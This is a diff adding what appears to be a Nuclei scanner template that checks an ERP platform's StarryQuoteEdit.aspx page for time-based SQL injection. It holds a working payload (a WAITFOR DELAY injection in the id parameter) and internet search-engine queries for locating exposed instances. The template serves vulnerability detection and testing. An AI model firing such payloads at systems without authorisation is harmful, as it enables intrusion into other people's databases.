@@ -1,0 +1,32 @@
+id: Confinement_Club_ERP_SQL_Injection
+
+info:
+  name: Confinement_Club_ERP_SQL_Injection
+  author: HK
+  severity: critical
+  description: StarryQuoteEdit.aspx SQL injection vulnerability in the ERP management cloud platform of the confinement club
+  metadata:
+    max-request: 1
+    Fofa-query: body="Page/Login/Login3.aspx"
+    Hunter-query: body="Page/Login/Login3.aspx"
+    Quake-query: body="Page/Login/Login3.aspx"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+    Accept-Charset: utf-8
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
